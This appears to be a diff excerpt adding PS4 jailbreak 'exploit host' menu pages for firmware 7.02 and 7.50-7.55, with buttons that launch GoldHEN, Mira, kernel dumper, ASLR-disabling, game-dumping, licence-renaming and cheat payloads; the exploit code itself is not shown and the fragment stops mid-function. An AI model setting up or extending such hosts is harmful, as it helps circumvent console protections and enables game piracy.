+document.cookie = 'kex=1';
+</script>
+</head>
+<body>
+<div id="menu">
+<h1 id="msgs">PS4 7.02 FW Host v1.4 by GamerHack</h1>
+<hr>
+<br>
+<h1 style="font-size: 18px;color: yellow;">Main Payloads</h1>
+<button class="btn" onmouseover="mainpayload1()" onmouseout="pagetitle()" onclick="load_goldhen23()"> GoldHEN v2.3 </button>
+<button class="btn" onmouseover="mainpayload2()" onmouseout="pagetitle()" onclick="load_hen()"> HEN v2.1.3 </button>
+<button class="btn" onmouseover="mainpayload3()" onmouseout="pagetitle()" onclick="load_mira()"> MIRA </button>
+<br>
+<h1 style="font-size: 18px;">Payloads</h1>
+<button class="btn" onmouseover="todex()" onmouseout="pagetitle()" onclick="load_todex()"> ToDex </button>
+<button class="btn" onmouseover="dumper()" onmouseout="pagetitle()" onclick="load_dumper()"> Dumper </button>
+<button class="btn" onmouseover="ftp()" onmouseout="pagetitle()" onclick="load_ftp()"> FTP </button>
+<button class="btn" onmouseover="binloader()" onmouseout="pagetitle()" onclick="load_binloader()"> Bin Loader </button>
+<br>
+<button class="btn" onmouseover="enableUpdates()" onmouseout="pagetitle()" onclick="load_enablebUpdates()"> Enable Updates </button>
+<button class="btn" onmouseover="disableUpdates()" onmouseout="pagetitle()" onclick="load_disableUpdates()"> Disable Updates </button>
+<button class="btn" onmouseover="app2usb()" onmouseout="pagetitle()" onclick="load_app2usb()"> App2USB </button>
+<button class="btn" onmouseover="enablevr()" onmouseout="pagetitle()" onclick="load_enablevr()"> Enable VR </button>
+<br>
+<button class="btn" onmouseover="dbackup()" onmouseout="pagetitle()" onclick="load_dbackup()"> DB Backup </button>
+<button class="btn" onmouseover="dbrestore()" onmouseout="pagetitle()" onclick="load_dbrestore()"> DB Restore </button>
+<button class="btn" onmouseover="linux1gb()" onmouseout="pagetitle()" onclick="load_linux1gb()"> Linux 1GB </button>
+<button class="btn" onmouseover="linux3gb()" onmouseout="pagetitle()" onclick="load_linux3gb()"> Linux 3GB </button>
+<br>
+<button class="btn" onmouseover="webrte()" onmouseout="pagetitle()" onclick="load_webrte()"> WebRTE </button>
+<button class="btn btn-onln" onmouseover="ps4trainer()" onmouseout="pagetitle()" onclick="load_ps4trainer()"> PS4 Trainer Web </button>
+<button class="btn" onmouseover="mods()" onmouseout="pagetitle()" onclick="mods_group()"> Games Mods </button>
+<button class="btn" onmouseover="historyBlocker()" onmouseout="pagetitle()" onclick="load_historyBlocker()"> History Blocker </button>
+<br>
+<button style="margin-left: 78px;" class="btn" onmouseover="webact()" onmouseout="pagetitle()" onclick="load_webact()"> Web-Activator </button>
+<button class="btn" onmouseover="ps4debug()" onmouseout="pagetitle()" onclick="load_ps4debug()"> PS4 Debug </button>
+<button class="btn" onmouseover="kernelClock()" onmouseout="pagetitle()" onclick="load_kernelClock()"> Kernel Clock </button>
+<button class="btn" onmouseover="fanthreshold()" onmouseout="pagetitle()"  style="margin-right:10px" onclick="load_fanthreshold()"> Fan Threshold </button><select id="tempC"></select>&#176;C
+<br>
+<button class="btn btn-toolbox" onmouseover="orbistoolbox()" onmouseout="pagetitle()" onclick="load_toolbox()"> Orbis-Toolbox </button>
+</div>
+<div id="mods">
+<h1 id="msgs-mods">Games Mods</h1>
+<hr>
+<br>
+<h1 style="font-size: 18px;">Payloads</h1>
+<button class="btn" onmouseover="arabicGuy100()" onmouseout="pagetitle()" onclick="load_arabicGuy100()"> Arabic Guy v1.00 </button>
+<button class="btn" onmouseover="arabicGuy127()" onmouseout="pagetitle()" onclick="load_arabicGuy127()"> Arabic Guy v1.27 </button>
+<button class="btn" onmouseover="arabicGuy132()" onmouseout="pagetitle()" onclick="load_arabicGuy132()"> Arabic Guy v1.32 </button>
+<button class="btn" onmouseover="Lamance()" onmouseout="pagetitle()" onclick="load_Lamance()"> Lamance v0.9 - 1.38 </button>
+<button class="btn" onmouseover="GTAWM146()" onmouseout="pagetitle()" onclick="load_WildeModz146()"> WildeModz-1.46 </button>
+<br>
+<button class="btn" onmouseover="RedDeadMod1()" onmouseout="pagetitle()" onclick="load_Oysters100()"> RDR2 v1.00 </button>
+<button class="btn" onmouseover="RedDeadMod2()" onmouseout="pagetitle()" onclick="load_Oysters113()"> RDR2 v1.13 </button>
+<button class="btn" onmouseover="RedDeadMod3()" onmouseout="pagetitle()" onclick="load_Oysters119()"> RDR2 v1.19 </button>
+<button class="btn" onmouseover="RedDeadMod4()" onmouseout="pagetitle()" onclick="load_Oysters124()"> RDR2 v1.24 </button>
+<button class="btn" onmouseover="RedDeadMod5()" onmouseout="pagetitle()" onclick="load_Oysters129()"> RDR2 v1.29 </button>
+<br>
+<button class="btn" onclick="load_menu()" style="margin-bottom: 303px"> Return </button>
+</div>
+<h1 style="margin-top: 43px;">Special Thanks to:<a href="https://twitter.com/sleirsgoevy" style="color: #f31414;margin-left: 10px;margin-right: 10px;">@sleirsgoevy</a>ChendoChap<a href="https://twitter.com/_AlAzif" style="color: #f31414;margin-left: 10px;">@_AlAzif</a></h1>
+<script>
+function mods_group(){
+document.getElementById("mods").style.display = "block";
+document.getElementById("menu").style.display = "none";
+}
+
+function load_menu(){
+document.getElementById("menu").style.display = "block";
+document.getElementById("mods").style.display = "none";
+}
+
+function mainpayload1(){
+document.getElementById("msgs").innerHTML = "GoldHEN v2.3 for Firmware 7.02 (Includes Temporary Fix for CE-30391-6)";
+}
+
+function mainpayload2(){
+document.getElementById("msgs").innerHTML = "HEN v2.1.3 for Firmware 7.02";
+}
+
+function mainpayload3(){
+document.getElementById("msgs").innerHTML = "MIRA for Firmware 7.02";
+}
+
+function todex(){
+document.getElementById("msgs").innerHTML = "Enable Some Debugging Functions Available on TestKit";
+}
+
+function dumper(){
+document.getElementById("msgs").innerHTML = "Dump Games to USB Drive";
+}
+
+function ftp(){
+document.getElementById("msgs").innerHTML = "Access this console Through FTP (Be careful what you do)";
+}
+
+function binloader(){
+document.getElementById("msgs").innerHTML = "Inject a Payload Using the IP of the console and Port 9020";
+}
+
+function enableUpdates(){
+document.getElementById("msgs").innerHTML = "Enable System Updates";
+}
+
+function disableUpdates(){
+document.getElementById("msgs").innerHTML = "Disable System Updates";
+}
+
+function app2usb(){
+document.getElementById("msgs").innerHTML = "Transfer Games / Apps to USB Drive in exFAT";
+}
+
+function enablevr(){
+document.getElementById("msgs").innerHTML = "Enable PSVR (You must start HEN or MIRA before)";
+}
+
+function dbackup(){
+document.getElementById("msgs").innerHTML = "Creates a Backup of the Console Database and Your User on a USB Drive";
+}
+
+function dbrestore(){
+document.getElementById("msgs").innerHTML = "Restore Database Backup from USB Drive";
+}
+
+function linux1gb(){
+document.getElementById("msgs").innerHTML = "Load Linux From USB Drive with 1GB VRAM";
+}
+
+function linux3gb(){
+document.getElementById("msgs").innerHTML = "Load Linux From USB Drive with 3GB VRAM";
+}
+
+function webrte(){
+document.getElementById("msgs").innerHTML = "Required to Activate Cheats Through the PS4 Trainer Website";
+}
+
+function ps4trainer(){
+document.getElementById("msgs").innerHTML = "Link to PS4 Trainer Website (Follow Instructions There)";
+}
+
+function orbistoolbox(){
+document.getElementById("msgs").innerHTML = "Orbis ToolBox Alpha Build 1167 for Firmware 7.55";
+}
+
+function mods(){
+document.getElementById("msgs").innerHTML = "Games Mods";
+}
+
+function historyBlocker(){
+document.getElementById("msgs").innerHTML = "Disable Browser History, it will only show Frequently used Pages once you open";
+}
+
+function webact(){
+document.getElementById("msgs").innerHTML = "Activate Your User Account from the Console Browser";
+}
+
+function ps4debug(){
+document.getElementById("msgs").innerHTML = "Activate Your User Account Offline";
+}
+
+function kernelClock(){
+document.getElementById("msgs").innerHTML = "Change the Time for the Console Kernel Clock";
+}
+
+function fanthreshold(){
+document.getElementById("msgs").innerHTML = "Modify PS4 Fan Speed";
+}
+
+function orbistoolbox(){
+document.getElementById("msgs").innerHTML = "Orbis ToolBox Alpha Build 1167";
+}
+
+function arabicGuy100(){
+document.getElementById("msgs-mods").innerHTML = "GTA V Mod Arabic Guy v1.00 (L1 + R1)";
+}
+
+function arabicGuy127(){
+document.getElementById("msgs-mods").innerHTML = "GTA V Mod Arabic Guy v1.27 (L1 + R1)";
+}
+
+function arabicGuy132(){
+document.getElementById("msgs-mods").innerHTML = "GTA V Mod Arabic Guy v1.32 (L1 + R1)";
+}
+
+function Lamance(){
+document.getElementById("msgs-mods").innerHTML = "GTA V Mod - Lamance v0.9 - 1.38 (Right + Square)";
+}
+
+function GTAWM146(){
+document.getElementById("msgs-mods").innerHTML = "GTA V Mod - WildeModz-1.46";
+}
+
+function RedDeadMod1(){
+document.getElementById("msgs-mods").innerHTML = "Red Dead Redemption 2 Mod - Oysters Menu 1.00 v1.3.8";
+}
+
+function RedDeadMod2(){
+document.getElementById("msgs-mods").innerHTML = "Red Dead Redemption 2 Mod - Oysters Menu 1.13 v1.3.8";
+}
+
+function RedDeadMod3(){
+document.getElementById("msgs-mods").innerHTML = "Red Dead Redemption 2 Mod - Oysters Menu 1.19 v1.3.8";
+}
+
+function RedDeadMod4(){
+document.getElementById("msgs-mods").innerHTML = "Red Dead Redemption 2 Mod - Oysters Menu 1.24 v1.3.8";
+}
+
+function RedDeadMod5(){
+document.getElementById("msgs-mods").innerHTML = "Red Dead Redemption 2 Mod - Oysters Menu 1.29 v1.3.8";
+}
+
+function pagetitle(){
+document.getElementById("msgs").innerHTML = "PS4 7.02 FW Host v1.4 by GamerHack";
+document.getElementById("msgs-mods").innerHTML = "Games Mods";
+}
+
+for(var i=50; i<=75; i=i+5){
+    var select = document.getElementById("tempC");
+    var option = document.createElement("OPTION");
+	select.options.add(option);
+	option.text = i;
+	option.value = i;
+}
+tempC.value=60;
+
+function load_goldhen23(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=goldhen_2.3.js';
+        link.click();
+}
+
+function load_hen(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=hen213.js';
+        link.click();
+}
+
+function load_mira(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=mira2.js';
+        link.click();
+}
+
+function load_todex(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=todex.js';
+        link.click();
+}
+
+function load_dumper(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=dumper.js';
+        link.click();
+}
+
+function load_ftp(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=ftp.js';
+        link.click();
+}
+
+function load_binloader(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'BinLoader/index.html';
+        link.click();
+}
+
+function load_enablebUpdates(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=enable-updates.js';
+        link.click();
+}
+
+function load_disableUpdates(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=disable-updates.js';
+        link.click();
+}
+
+function load_app2usb(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=app2usb.js';
+        link.click();
+}
+
+function load_enablevr(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=enable-vr.js';
+        link.click();
+}
+
+function load_dbackup(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=dbackup.js';
+        link.click();
+}
+
+function load_dbrestore(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=dbrestore.js';
+        link.click();
+}
+
+function load_linux1gb(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=linux702-1gb.js';
+        link.click();
+}
+
+function load_linux3gb(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=linux702-3gb.js';
+        link.click();
+}
+
+function load_webrte(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'WebRTE/index.html';
+        link.click();
+}
+
+function load_ps4trainer(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'http://ps4trainer.com/Trainer/index.html';
+        link.click();
+}
+
+function load_historyBlocker(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=history-blocker.js';
+        link.click();
+}
+
+function load_webact(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'WebActivator/web-activator.html';
+        link.click();
+}
+
+function load_ps4debug(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'PS4Debug/index.html';
+        link.click();
+}
+
+function load_kernelClock(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=kernel-clock.js';
+        link.click();
+}
+
+function load_fanthreshold(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = "payload.html#f=fan-threshold"+tempC.value+".js";
+        link.click();
+}
+
+function load_toolbox(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=Orbis-Toolbox-702.js';
+        link.click();
+}
+
+function load_arabicGuy100(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=arabic-guy100.js';
+        link.click();
+}
+
+function load_arabicGuy127(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=arabic-guy127.js';
+        link.click();
+}
+
+function load_arabicGuy132(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=arabic-guy132.js';
+        link.click();
+}
+
+function load_Lamance(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=Lamance-v0.9-1.38.js';
+        link.click();
+}
+
+function load_WildeModz146(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=WildeModz-1.46.js';
+        link.click();
+}
+
+function load_Oysters100(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=OystersMenu-v1.3.8-v1.00.js';
+        link.click();
+}
+
+function load_Oysters113(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=OystersMenu-v1.3.8-v1.13.js';
+        link.click();
+}
+
+function load_Oysters119(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=OystersMenu-v1.3.8-v1.19.js';
+        link.click();
+}
+
+function load_Oysters124(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=OystersMenu-v1.3.8-v1.24.js';
+        link.click();
+}
+
+function load_Oysters129(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=OystersMenu-v1.3.8-v1.29.js';
+        link.click();
+}
+
+var jailbreak_start_date = localStorage.getItem("jailbreak_start_date");
+if (jailbreak_start_date !== null) {
+  localStorage.removeItem("jailbreak_start_date");
+}
+</script>
+</body>
+</html>
+
+        <button class="back-btn" onclick="hideContent('content702')">العودة إلى القائمة الرئيسية</button>
+    </div>
+
+    <div id="content750" class="content">
+        <h2>7.50-7.55 Exploit Host</h2>
+        <p>PS4 7.50-7.55 FW GOLDHEN</p>
+<!DOCTYPE html>
+<html manifest="cache.manifest">
+<head>
+<title>PS4 7.50 - 7.55 FW Host v1.5 by GamerHack</title>
+<link rel="stylesheet" href="../style.css">
+<script>
+function DLProgress(e){Percent=(Math.round(e.loaded / e.total * 100));document.getElementById="display:none";window.msgs.innerHTML="Installing Offline Cache: " + Percent + "%";}
+function DisplayCacheProgress(){setTimeout(function(){window.msgs.innerHTML="Cache Installed Successfully ✔";},1000);setTimeout(function(){window.msgs.innerHTML="Now Close And Re-Open Your Browser ...";},3000);}window.applicationCache.addEventListener("progress",DLProgress,false);window.applicationCache.oncached=function(e){DisplayCacheProgress();};window.applicationCache.onupdateready=function(e){DisplayCacheProgress();};
+document.cookie = 'kex=1';
+</script>
+</head>
+<body>
+<div id="menu">
+<h1 id="msgs">PS4 7.50 - 7.55 FW Host v1.5 by GamerHack</h1>
+<hr>
+<br>
+<h1 style="font-size: 18px;color: yellow;">Main Payloads</h1>
+<button class="btn" onmouseover="mainpayload1()" onmouseout="pagetitle()" onclick="load_goldhen23()"> GoldHEN v2.3 </button>
+<button class="btn" onmouseover="mainpayload2()" onmouseout="pagetitle()" onclick="load_mira75x()"> MIRA 7.5x </button>
+<button class="btn" onmouseover="mainpayload3()" onmouseout="pagetitle()" onclick="load_binloader()"> Bin Loader </button>
+<br>
+<h1 style="font-size: 18px;">Payloads</h1>
+<button class="btn" onmouseover="todex()" onmouseout="pagetitle()" onclick="load_todex()"> ToDex </button>
+<button class="btn" onmouseover="dumper()" onmouseout="pagetitle()" onclick="load_dumper()"> Dumper </button>
+<button class="btn" onmouseover="ftp()" onmouseout="pagetitle()" onclick="load_ftp()"> FTP </button>
+<button class="btn" onmouseover="app2usb()" onmouseout="pagetitle()" onclick="load_app2usb()"> App2USB </button>
+<br>
+<button class="btn" onmouseover="enableUpdates()" onmouseout="pagetitle()" onclick="load_enablebUpdates()"> Enable Updates </button>
+<button class="btn" onmouseover="disableUpdates()" onmouseout="pagetitle()" onclick="load_disableUpdates()"> Disable Updates </button>
+<button class="btn" onmouseover="dbackup()" onmouseout="pagetitle()" onclick="load_dbackup()"> DB Backup </button>
+<button class="btn" onmouseover="dbrestore()" onmouseout="pagetitle()" onclick="load_dbrestore()"> DB Restore </button>
+<br>
+<button class="btn" onmouseover="historyBlocker()" onmouseout="pagetitle()" onclick="load_historyBlocker()"> History Blocker </button>
+<button class="btn" onmouseover="ebrowser()" onmouseout="pagetitle()" onclick="load_ebrowser()"> Enable Browser </button>
+<button class="btn" onmouseover="kernelDump()" onmouseout="pagetitle()" onclick="load_kernelDump()"> Kernel Dumper </button>
+<button class="btn" onmouseover="kernelClock()" onmouseout="pagetitle()" onclick="load_kernelClock()"> Kernel Clock </button>
+<br>
+<button class="btn" style="margin-left: 77px" onmouseover="ps4debug()" onmouseout="pagetitle()" onclick="load_ps4debug()"> PS4 Debug </button>
+<button class="btn" onmouseover="disbaslr()" onmouseout="pagetitle()" onclick="load_disbAslr()"> Disable ASLR </button>
+<button class="btn" onmouseover="rifrenamer()" onmouseout="pagetitle()" onclick="load_rifRen()"> RIF Renamer </button>
+<button class="btn" onmouseover="fanthreshold()" onmouseout="pagetitle()"  style="margin-right:10px" onclick="load_fanthreshold()"> Fan Threshold </button><select id="tempC"></select>&#176;C
+<br>
+<button class="btn" onmouseover="webact()" onmouseout="pagetitle()" onclick="load_webact()"> Web-Activator </button>
+<button class="btn" onmouseover="exitidu()" onmouseout="pagetitle()" onclick="load_exitidu()"> Exit IDU </button>
+<button class="btn" onmouseover="linux1gb()" onmouseout="pagetitle()" onclick="load_linux1gb()"> Linux 1GB </button>
+<button class="btn" onmouseover="linux3gb()" onmouseout="pagetitle()" onclick="load_linux3gb()"> Linux 3GB </button>
+<br>
+<button class="btn" onmouseover="mods()" onmouseout="pagetitle()" onclick="mods_group()"> Games Mods </button>
+<button class="btn btn-toolbox" onmouseover="orbistoolbox()" onmouseout="pagetitle()" onclick="load_toolbox()"> Orbis-Toolbox </button>
+<button class="btn" onmouseover="webrte()" onmouseout="pagetitle()" onclick="load_webrte()"> WebRTE </button>
+<button class="btn btn-onln" onmouseover="ps4trainer()" onmouseout="pagetitle()" onclick="load_ps4trainer()"> PS4 Trainer Web </button>
+</div>
+<div id="mods">
+<h1 id="msgs-mods">Games Mods</h1>
+<hr>
+<br>
+<h1 style="font-size: 18px;">Payloads</h1>
+<button class="btn" onmouseover="Lamance()" onmouseout="pagetitle()" onclick="load_Lamance()"> Lamance v0.9 - 1.38 </button>
+<button class="btn" onmouseover="GTAWM146()" onmouseout="pagetitle()" onclick="load_WildeModz146()"> WildeModz-1.46 </button>
+<br>
+<button class="btn" onmouseover="RedDeadMod1()" onmouseout="pagetitle()" onclick="load_Oysters100()"> RDR2 v1.00 </button>
+<button class="btn" onmouseover="RedDeadMod2()" onmouseout="pagetitle()" onclick="load_Oysters113()"> RDR2 v1.13 </button>
+<button class="btn" onmouseover="RedDeadMod3()" onmouseout="pagetitle()" onclick="load_Oysters119()"> RDR2 v1.19 </button>
+<button class="btn" onmouseover="RedDeadMod4()" onmouseout="pagetitle()" onclick="load_Oysters124()"> RDR2 v1.24 </button>
+<button class="btn" onmouseover="RedDeadMod5()" onmouseout="pagetitle()" onclick="load_Oysters129()"> RDR2 v1.29 </button>
+<br>
+<button class="btn" onclick="load_menu()" style="margin-bottom: 303px;"> Return </button>
+</div>
+<h1 style="margin-top: 43px;">Special Thanks to:<a href="https://twitter.com/sleirsgoevy" style="color: #f31414;margin-left: 10px;margin-right: 10px;">@sleirsgoevy</a>ChendoChap<a href="https://twitter.com/_AlAzif" style="color: #f31414;margin-left: 10px;">@_AlAzif</a></h1>
+<script>
+function mods_group(){
+document.getElementById("mods").style.display = "block";
+document.getElementById("menu").style.display = "none";
+}
+
+function load_menu(){
+document.getElementById("menu").style.display = "block";
+document.getElementById("mods").style.display = "none";
+}
+
+function mainpayload1(){
+document.getElementById("msgs").innerHTML = "GoldHEN v2.3 for Firmware 7.55 (Includes Temporary Fix for CE-30391-6)";
+}
+
+function mainpayload2(){
+document.getElementById("msgs").innerHTML = "MIRA for All Firmwares 7.5x";
+}
+
+function mainpayload3(){
+document.getElementById("msgs").innerHTML = "Inject a Payload Using the IP of the console and Port 9021";
+}
+
+function todex(){
+document.getElementById("msgs").innerHTML = "Enable Some Debugging Functions Available on TestKit";
+}
+
+function dumper(){
+document.getElementById("msgs").innerHTML = "Dump Games to USB Drive";
+}
+
+function ftp(){
+document.getElementById("msgs").innerHTML = "Access this console Through FTP (Be careful what you do)";
+}
+
+function app2usb(){
+document.getElementById("msgs").innerHTML = "Transfer Games / Apps to USB Drive in exFAT";
+}
+
+function enableUpdates(){
+document.getElementById("msgs").innerHTML = "Enable System Updates";
+}
+
+function disableUpdates(){
+document.getElementById("msgs").innerHTML = "Disable System Updates";
+}
+
+function dbackup(){
+document.getElementById("msgs").innerHTML = "Creates a Backup of the Console Database and Your User on a USB Drive";
+}
+
+function dbrestore(){
+document.getElementById("msgs").innerHTML = "Restore Database Backup from USB Drive";
+}
+
+function historyBlocker(){
+document.getElementById("msgs").innerHTML = "Disable Browser History, it will only show Frequently used Pages once you open";
+}
+
+function ebrowser(){
+document.getElementById("msgs").innerHTML = "Enable The PS4 Browser";
+}
+
+function kernelDump(){
+document.getElementById("msgs").innerHTML = "Dump a Conole Kernel to USB Drive";
+}
+
+function kernelClock(){
+document.getElementById("msgs").innerHTML = "Change the Time for the Console Kernel Clock";
+}
+
+function ps4debug(){
+document.getElementById("msgs").innerHTML = "Activate Your User Account Offline";
+}
+
+function disbaslr(){
+document.getElementById("msgs").innerHTML = "Disables the ASLR (Address space layout randomization)";
+}
+
+function rifrenamer(){
+document.getElementById("msgs").innerHTML = "Renames 'fake' RIFs to 'free' RIFs";
+}
+
+function fanthreshold(){
+document.getElementById("msgs").innerHTML = "Modify PS4 FAN Speed";
+}
+
+function webact(){
+document.getElementById("msgs").innerHTML = "Activate Your User Account from the Console Browser";
+}
+
+function exitidu(){
+document.getElementById("msgs").innerHTML = "Disable IDU Mode, if you have activated it by mistake";
+}
+
+function linux1gb(){
+document.getElementById("msgs").innerHTML = "Load Linux with 1GB VRAM";
+}
+
+function linux3gb(){
+document.getElementById("msgs").innerHTML = "Load Linux with 3GB VRAM";
+}
+
+function mods(){
+document.getElementById("msgs").innerHTML = "Games Mods";
+}
+
+function orbistoolbox(){
+document.getElementById("msgs").innerHTML = "Orbis ToolBox Alpha Build 1167 for Firmware 7.55";
+}
+
+function webrte(){
+document.getElementById("msgs").innerHTML = "Required to Activate Cheats Through the PS4 Trainer Website";
+}
+
+function ps4trainer(){
+document.getElementById("msgs").innerHTML = "PS4 Trainer Website (Follow Instructions There)";
+}
+
+function Lamance(){
+document.getElementById("msgs-mods").innerHTML = "GTA V Mod - Lamance v0.9 - 1.38 (Right + Square)";
+}
+
+function GTAWM146(){
+document.getElementById("msgs-mods").innerHTML = "GTA V Mod - WildeModz-1.46";
+}
+
+function RedDeadMod1(){
+document.getElementById("msgs-mods").innerHTML = "Red Dead Redemption 2 Mod - Oysters Menu 1.00 v1.3.8";
+}
+
+function RedDeadMod2(){
+document.getElementById("msgs-mods").innerHTML = "Red Dead Redemption 2 Mod - Oysters Menu 1.13 v1.3.8";
+}
+
+function RedDeadMod3(){
+document.getElementById("msgs-mods").innerHTML = "Red Dead Redemption 2 Mod - Oysters Menu 1.19 v1.3.8";
+}
+
+function RedDeadMod4(){
+document.getElementById("msgs-mods").innerHTML = "Red Dead Redemption 2 Mod - Oysters Menu 1.24 v1.3.8";
+}
+
+function RedDeadMod5(){
+document.getElementById("msgs-mods").innerHTML = "Red Dead Redemption 2 Mod - Oysters Menu 1.29 v1.3.8";
+}
+
+function pagetitle(){
+document.getElementById("msgs").innerHTML = "PS4 7.50 - 7.55 FW Host v1.5 by GamerHack";
+document.getElementById("msgs-mods").innerHTML = "Games Mods";
+}
+
+for(var i=40; i<=79; i++){
+    var select = document.getElementById("tempC");
+    var option = document.createElement("OPTION");
+	select.options.add(option);
+	option.text = i;
+	option.value = i;
+}
+tempC.value=60;
+
+function load_goldhen23(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=goldhen_2.3.js';
+        link.click();
+}
+
+function load_mira75x(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'mira-75x.html';
+        link.click();
+}
+
+function load_binloader(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html';
+        link.click();
+}
+
+function load_todex(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=todex.js';
+        link.click();
+}
+
+function load_dumper(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=app-dumper.js';
+        link.click();
+}
+
+function load_ftp(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=ftp.js';
+        link.click();
+}
+
+function load_app2usb(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=app2usb.js';
+        link.click();
+}
+
+function load_enablebUpdates(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=enable-updates.js';
+        link.click();
+}
+
+function load_disableUpdates(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=disable-updates.js';
+        link.click();
+}
+
+function load_dbackup(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=backup.js';
+        link.click();
+}
+
+function load_dbrestore(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=restore.js';
+        link.click();
+}
+
+function load_historyBlocker(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=history-blocker.js';
+        link.click();
+}
+
+function load_ebrowser(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=enable-browser.js';
+        link.click();
+}
+
+function load_kernelDump(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=kernel-dumper.js';
+        link.click();
+}
+
+function load_kernelClock(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=kernel-clock.js';
+        link.click();
+}
+
+function load_ps4debug(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=ps4debug.js';
+        link.click();
+}
+
+function load_disbAslr(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=disable-aslr.js';
+        link.click();
+}
+
+function load_rifRen(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=rif-renamer.js';
+        link.click();
+}
+
+function load_fanthreshold(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=fanThreshold.js';localStorage.setItem('fanthreshold', tempC.value);
+        link.click();
+}
+
+function load_webact(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'web-activator.html';
+        link.click();
+}
+
+function load_exitidu(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=idu.js';
+        link.click();
+}
+
+function load_linux1gb(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=linux-1gb.js';
+        link.click();
+}
+
+function load_linux3gb(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=linux-3gb.js';
+        link.click();
+}
+
+function load_toolbox(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=Orbis-Toolbox-755.js';
+        link.click();
+}
+
+function load_webrte(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=webrte.js';
+        link.click();
+}
+
+function load_ps4trainer(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'http://ps4trainer.com/Trainer/index.html';
+		link.target = "blank";
+        link.click();
+}
+
+function load_Lamance(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
+        link.href = 'payload.html#f=Lamance-v0.9-1.38.js';
+        link.click();
+}
+
+function load_WildeModz146(){
+
+  var link = document.createElement('a');
+        document.body.appendChild(link);
